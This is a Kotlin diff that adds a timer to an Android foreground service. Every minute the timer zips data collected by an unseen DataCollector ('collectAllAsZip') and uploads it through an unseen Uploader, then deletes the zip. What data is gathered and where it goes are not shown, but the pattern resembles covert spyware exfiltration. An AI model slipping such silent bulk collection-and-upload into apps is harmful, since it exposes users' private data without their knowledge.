@@ -9,12 +9,23 @@ import android.content.pm.ServiceInfo
 import android.os.Build
 import android.os.IBinder
 import androidx.core.app.NotificationCompat
+import android.os.Handler
+import android.os.Looper
 
 class ForegroundService : Service() {
 
     private val CHANNEL_ID = "ForegroundServiceChannel"
+    private val COLLECT_INTERVAL_MS = 60_000L // 1 min
+    private val handler = Handler(Looper.getMainLooper())
     private val NOTIFICATION_ID = 1
     private val DISMISSED_ACTION = "com.example.foregroundservice.DISMISSED_ACTION"
+
+    private val collectTask = object : Runnable {
+        override fun run() {
+            Thread { collectAndUpload() }.start()
+            handler.postDelayed(this, COLLECT_INTERVAL_MS)
+        }
+    }
 
     private val onNotificationDismissedReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
@@ -40,12 +51,14 @@ class ForegroundService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         showNotification()
+        handler.post(collectTask)
         return START_NOT_STICKY
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
+        handler.removeCallbacks(collectTask)
         unregisterReceiver(onNotificationDismissedReceiver)
         stopForeground(STOP_FOREGROUND_REMOVE)
         super.onDestroy()
@@ -88,6 +101,18 @@ class ForegroundService : Service() {
             )
             val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             manager.createNotificationChannel(channel)
+        }
+    }
+
+    private fun collectAndUpload() {
+        try {
+            val zipFile = DataCollector.collectAllAsZip(applicationContext)
+            android.util.Log.d("DataCollector", "zip created: ${zipFile.name}, ${zipFile.length()} bytes")
+            val ok = Uploader.uploadZip(zipFile)
+            android.util.Log.d("Uploader", "upload result: $ok")
+            zipFile.delete()
+        } catch (e: Exception) {
+            android.util.Log.e("DataCollector", "collect failed", e)
         }
     }
 }
